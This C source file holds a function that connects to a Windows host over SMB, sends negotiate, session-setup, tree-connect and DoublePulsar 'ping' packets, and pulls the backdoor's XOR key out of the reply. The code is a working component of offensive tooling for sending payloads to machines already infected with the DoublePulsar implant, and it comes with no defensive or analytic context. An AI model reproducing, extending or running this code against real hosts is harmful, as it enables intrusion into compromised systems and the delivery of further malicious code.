#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <string.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    unsigned char negotiate[sizeof(SMB_NEGOTIATE_PKT)];
    unsigned char session_setup[sizeof(SMB_SESSION_SETUP_PKT)];
    unsigned char tree_connect[sizeof(SMB_TREE_CONNECT_PKT)];
    unsigned char dp_ping[sizeof(DP_PING_PKT)];
    unsigned char response[65536];
    unsigned char user_id[2];
    unsigned char tree_id[2];
    const unsigned char *packets[4];
    size_t packet_lengths[4];
    size_t response_length = 0;
    SOCKET sock;
    unsigned int result = 0;
    int stage;

    if (ip == NULL || port < 1 || port > 65535)
        return 0;

    memcpy(negotiate, SMB_NEGOTIATE_PKT, sizeof(negotiate));
    memcpy(session_setup, SMB_SESSION_SETUP_PKT, sizeof(session_setup));
    memcpy(tree_connect, SMB_TREE_CONNECT_PKT, sizeof(tree_connect));
    memcpy(dp_ping, DP_PING_PKT, sizeof(dp_ping));

    packets[0] = negotiate;
    packet_lengths[0] = sizeof(SMB_NEGOTIATE_PKT) - 1;
    packets[1] = session_setup;
    packet_lengths[1] = sizeof(SMB_SESSION_SETUP_PKT) - 1;
    packets[2] = tree_connect;
    packet_lengths[2] = sizeof(SMB_TREE_CONNECT_PKT) - 1;
    packets[3] = dp_ping;
    packet_lengths[3] = sizeof(DP_PING_PKT) - 1;

    sock = smb_connect(ip, port);
    if (sock == INVALID_SOCKET)
        return 0;

    for (stage = 0; stage < 4; ++stage) {
        size_t sent = 0;

        if (stage == 2) {
            if (sizeof(tree_connect) <= 33)
                goto cleanup;
            tree_connect[32] = user_id[0];
            tree_connect[33] = user_id[1];
        } else if (stage == 3) {
            if (sizeof(dp_ping) <= 33 || response_length <= 33 ||
                response_length <= 29)
                goto cleanup;
            tree_id[0] = response[28];
            tree_id[1] = response[29];
            user_id[0] = response[32];
            user_id[1] = response[33];
            dp_ping[28] = tree_id[0];
            dp_ping[29] = tree_id[1];
            dp_ping[32] = user_id[0];
            dp_ping[33] = user_id[1];
        }

        while (sent < packet_lengths[stage]) {
            size_t remaining = packet_lengths[stage] - sent;
            int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
            int count = send(sock, (const char *)packets[stage] + sent,
                             chunk, 0);
            if (count <= 0)
                goto cleanup;
            sent += (size_t)count;
        }

        for (;;) {
            size_t header_bytes = 0;
            unsigned long payload_length;

            while (header_bytes < 4) {
                int count = recv(sock, (char *)response + header_bytes,
                                 (int)(4 - header_bytes), 0);
                if (count <= 0)
                    goto cleanup;
                header_bytes += (size_t)count;
            }

            payload_length = ((unsigned long)response[1] << 16) |
                             ((unsigned long)response[2] << 8) |
                             (unsigned long)response[3];
            if (payload_length > sizeof(response) - 4)
                goto cleanup;

            response_length = 4;
            while (response_length < 4 + (size_t)payload_length) {
                size_t remaining = 4 + (size_t)payload_length - response_length;
                int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
                int count = recv(sock, (char *)response + response_length,
                                 chunk, 0);
                if (count <= 0)
                    goto cleanup;
                response_length += (size_t)count;
            }

            if (response[0] == 0x85 && payload_length == 0)
                continue;
            break;
        }

        if (stage == 1) {
            if (response_length <= 33)
                goto cleanup;
            user_id[0] = response[32];
            user_id[1] = response[33];
        }
    }

    if (SMB_RESP_SIGNATURE_END - SMB_RESP_SIGNATURE_START != 4 ||
        SMB_RESP_SIGNATURE_START > response_length ||
        response_length - SMB_RESP_SIGNATURE_START < 4)
        goto cleanup;

    result = (unsigned int)response[SMB_RESP_SIGNATURE_START] |
             ((unsigned int)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
             ((unsigned int)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
             ((unsigned int)response[SMB_RESP_SIGNATURE_START + 3] << 24);

cleanup:
    closesocket(sock);
    return result;
}